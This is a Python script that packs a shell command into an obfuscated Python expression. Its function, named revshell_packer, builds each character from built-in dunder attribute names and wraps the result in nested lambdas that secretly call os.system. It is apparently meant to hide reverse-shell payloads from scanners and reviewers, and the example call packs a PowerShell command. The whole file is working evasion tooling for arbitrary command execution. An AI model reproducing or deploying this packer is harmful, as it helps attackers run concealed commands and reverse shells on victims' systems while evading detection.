options = ["[].__iter__().__class__.__name__",
           "{}.__iter__().__class__.__name__",
           "().__iter__().__class__.__name__",
           "[].__iter__().__class__.__dict__.__class__.__name__",
           "{}.__iter__().__class__.__dict__.__class__.__name__,"
           " ().__iter__().__class__.__dict__.__class__.__name__",
           "[].__iter__().__class__.__dict__.__reduce__.__name__",
           "{}.__iter__().__class__.__dict__.__reduce__.__name__",
           "().__iter__().__class__.__dict__.__reduce__.__name__",
           "[].__iter__().__class__.__dict__.__getattribute__.__name__",
           "{}.__iter__().__class__.__dict__.__getattribute__.__name__",
           " ().__iter__().__class__.__dict__.__getattribute__.__name__",
            "[].__iter__().__class__.__dict__.__len__.__name__",
            "[].__iter__().__class__.__dict__['__length_hint__'].__name__",
            "[].__iter__().__class__.__dict__['__next__'].__name__",
           "[].__iter__().__class__.__dict__['__length_hint__'].__class__.__name__",
           "[].__iter__().__class__.__dict__['__next__'].__class__.__name__",
           "[].__iter__().__class__.__class__.__call__(int).__class__.__dict__['__doc__']",
           """ int().__class__.__class__.__name__.__class__.__class__.__call__(int).__class__.__name__.__class__.__class__.__call__(int).__class__.__class__.__call__(type('xw',(),{"__doc__" : "!@#$%^&*;[].,/\a"})).__class__.__dict__['__doc__']""",
           "int().__class__.__class__.__name__.__class__.__class__.__call__(int).__class__.__name__.__class__.__class__.__call__(int).__class__.__class__.__call__(object).__class__.__doc__",

           "int().__class__.__class__.__name__.__class__.__class__.__call__(int).__class__.__name__.__class__.__class__.__call__(int).__class__.__class__.__call__(list).__class__.__doc__",
           "int().__class__.__class__.__name__.__class__.__class__.__call__(int).__class__.__name__.__class__.__class__.__call__(int).__class__.__class__.__call__(float).__class__.__doc__",


           ]


def find_char(char):
    for option_index, option in enumerate(options):
        evaled_option = eval(option.strip())
        for index,n_char in enumerate(evaled_option):
            if char == n_char:
                return {'to_eval' : option,'index' : index}



def revshell_packer(revshell):
    #f'{revshell} & echo '
    totally_obfuscated = []
    for index,char in enumerate([i for i in revshell]):
        if find_char(char):
            query = find_char(char)
            q_index = query['index']
            if q_index == 2:
                q_index = "_+_"
            elif q_index == 3:
                q_index = "_ + _ + _"
            elif q_index == 4:
                q_index = "_ + _ +_ +_"
            elif q_index == 5:
                q_index = "_ +_ +_ +_ +_"
            elif q_index == 0:
                q_index = "_ - _"
            elif q_index == 6:
                q_index = "___ +_ + _ +_"
            elif q_index == 7:
                q_index = "____ + _ +_ +_"
            elif q_index == 8:
                q_index = "______ + __"
            elif q_index == 1:
                q_index = "_"
            totally_obfuscated.append(f"{query['to_eval']}[{q_index}]\n")
        else:
            return "Error"
    totally_obfuscated.append(' "&"')
    obfuscated_revshell = """(lambda _, __, ___, ____, _____, ______, _______, ________:
    getattr(
        __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
        ().__class__.__eq__.__class__.__name__[__:__] +
        [].__iter__().__class__.__name__[__]+{}.__iter__().__class__.__name__[_______]+
        [].__iter__().__class__.__name__[__]+[].__iter__().__class__.__name__[______]+
        ().__iter__().__class__.__name__[____]+[].__iter__().__class__.__dict__.__class__.__name__[round(_/2)]
    )(placeholder +
         (lambda _, __, ___: _(_, __, ___))(
            lambda _, __, ___:
                chr(___ % __) + str(_(_, __, ___ // __)) if ___ else
                (lambda: _).__code__.co_lnotab,
            _ << ________,
            (((_____ << ____) + _) << ((___ << _____) - ___)) + (((((___ << __)
            - _) << ___) + _) << ((_____ << ____) + (_ << _))) + (((_______ <<
            __) - _) << (((((_ << ___) + _)) << ___) + (_ << _))) + (((_______
            << ___) + _) << ((_ << ______) + _)) + (((_______ << ____) - _) <<
            ((_______ << ___))) + (((_ << ____) - _) << ((((___ << __) + _) <<
            __) - _)) - (_______ << ((((___ << __) - _) << __) + _)) + (_______
            << (((((_ << ___) + _)) << __))) - ((((((_ << ___) + _)) << __) +
            _) << ((((___ << __) + _) << _))) + (((_______ << __) - _) <<
            (((((_ << ___) + _)) << _))) + (((___ << ___) + _) << ((_____ <<
            _))) + (_____ << ______) + (_ << ___)
        )
    )
)(
    *(lambda _, __, ___: _(_, __, ___))(
        (lambda _, __, ___:
         [__(___[(lambda: _).__code__.co_nlocals])] +
         _(_, __, ___[(lambda _: _).__code__.co_nlocals:]) if ___ else []
         ),
        lambda _: _.__code__.co_argcount,
        (
            lambda _: _,
            lambda _, __: _,
            lambda _, __, ___: _,
            lambda _, __, ___, ____: _,
            lambda _, __, ___, ____, _____: _,
            lambda _, __, ___, ____, _____, ______: _,
            lambda _, __, ___, ____, _____, ______, _______: _,
            lambda _, __, ___, ____, _____, ______, _______, ________: _
        )
    )
)""".replace('placeholder','+'.join(totally_obfuscated))
    return obfuscated_revshell

print(revshell_packer('powershell -c gci '))